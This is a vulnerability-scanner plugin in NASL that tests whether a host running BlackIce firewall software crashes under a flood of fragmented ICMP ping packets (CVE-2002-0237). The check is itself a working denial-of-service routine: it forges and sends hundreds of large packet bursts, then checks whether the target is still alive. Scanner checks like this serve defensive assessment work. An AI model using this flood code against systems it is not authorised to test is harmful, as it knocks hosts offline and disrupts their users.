if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10927" );
	script_version( "2019-10-29T09:45:45+0000" );
	script_tag( name: "last_modification", value: "2019-10-29 09:45:45 +0000 (Tue, 29 Oct 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4025 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2002-0237" );
	script_name( "BlackIce DoS (ping flood)" );
	script_category( ACT_FLOOD );
	script_copyright( "This script is Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "global_settings.sc", "os_detection.sc" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_mandatory_keys( "Host/runs_windows" );
	script_tag( name: "solution", value: "Upgrade your BlackIce software or remove it." );
	script_tag( name: "impact", value: "An attacker may use this attack to make this host crash continuously, preventing
  you from working properly." );
	script_tag( name: "summary", value: "It was possible to crash the remote machine by flooding it
  with 10 KB ping packets." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_probe" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
start_denial();
sleep( 2 );
up = end_denial();
if(!up){
	exit( 0 );
}
if(!fl){
	fl = 600;
}
if(!dl){
	dl = 60000;
}
if(!mtu){
	mtu = 1500;
}
maxdata = mtu - 20 - 8;
maxdata = maxdata / 8;
maxdata = maxdata * 8;
if(maxdata < 16){
	maxdata = 544;
}
src = this_host();
dst = get_host_ip();
id = 666;
seq = 0;
start_denial();
for(i = 0;i < fl;i++){
	id = id + 1;
	seq = seq + 1;
	for(j = 0;j < dl;j = j + maxdata){
		datalen = dl - j;
		o = j / 8;
		if(datalen > maxdata){
			o = o | 0x2000;
			datalen = maxdata;
		}
		ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_off: o, ip_p: IPPROTO_ICMP, ip_id: id, ip_ttl: 0x40, ip_src: this_host() );
		icmp = forge_icmp_packet( ip: ip, icmp_type: 8, icmp_code: 0, icmp_seq: seq, icmp_id: seq, data: crap( datalen - 8 ) );
		send_packet( packet: icmp, pcap_active: FALSE );
	}
}
alive = end_denial();
if(!alive){
	security_message( port: 0, proto: "icmp" );
	set_kb_item( name: "Host/dead", value: TRUE );
	exit( 0 );
}
exit( 99 );

